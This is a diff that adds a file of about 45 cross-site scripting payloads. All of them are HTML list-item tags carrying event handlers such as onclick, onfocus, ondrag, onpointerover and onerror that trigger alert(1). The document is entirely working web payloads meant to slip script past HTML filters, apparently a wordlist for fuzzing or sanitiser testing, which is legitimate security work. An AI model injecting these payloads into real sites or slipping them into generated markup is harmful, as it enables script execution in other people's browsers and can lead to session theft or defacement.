@@ -1,0 +1,45 @@
+<li style=list-style:url() onerror=alert(1)>
+<li draggable="true" ondrag="alert(1)">test</li>
+<li draggable="true" ondragend="alert(1)">test</li>
+<li draggable="true" ondragenter="alert(1)">test</li>
+<li draggable="true" ondragleave="alert(1)">test</li>
+<li draggable="true" ondragstart="alert(1)">test</li>
+<li id=x tabindex=1 onactivate=alert(1)></li>
+<li id=x tabindex=1 onbeforeactivate=alert(1)></li>
+<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>
+<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>
+<li id=x tabindex=1 onfocus=alert(1)></li>
+<li id=x tabindex=1 onfocusin=alert(1)></li>
+<li onafterscriptexecute=alert(1)><script>1</script>
+<li onbeforecopy="alert(1)" contenteditable>test</li>
+<li onbeforecut="alert(1)" contenteditable>test</li>
+<li onbeforepaste="alert(1)" contenteditable>test</li>
+<li onbeforescriptexecute=alert(1)><script>1</script>
+<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>
+<li onclick="alert(1)">test</li>
+<li oncontextmenu="alert(1)">test</li>
+<li oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<li oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<li ondblclick="alert(1)" autofocus tabindex=1>test</li>
+<li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>
+<li onkeydown="alert(1)" contenteditable>test</li>
+<li onkeypress="alert(1)" contenteditable>test</li>
+<li onkeyup="alert(1)" contenteditable>test</li>
+<li onmousedown="alert(1)">test</li>
+<li onmouseenter="alert(1)">test</li>
+<li onmouseleave="alert(1)">test</li>
+<li onmousemove="alert(1)">test</li>
+<li onmouseout="alert(1)">test</li>
+<li onmouseover="alert(1)">test</li>
+<li onmouseup="alert(1)">test</li>
+<li onmousewheel=alert(1)>requires scrolling
+<li onpaste="alert(1)" contenteditable>test</li>
+<li onpointerdown=alert(1)>XSS</li>
+<li onpointerenter=alert(1)>XSS</li>
+<li onpointerleave=alert(1)>XSS</li>
+<li onpointermove=alert(1)>XSS</li>
+<li onpointerout=alert(1)>XSS</li>
+<li onpointerover=alert(1)>XSS</li>
+<li onpointerrawupdate=alert(1)>XSS</li>
+<li onpointerup=alert(1)>XSS</li>
+<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
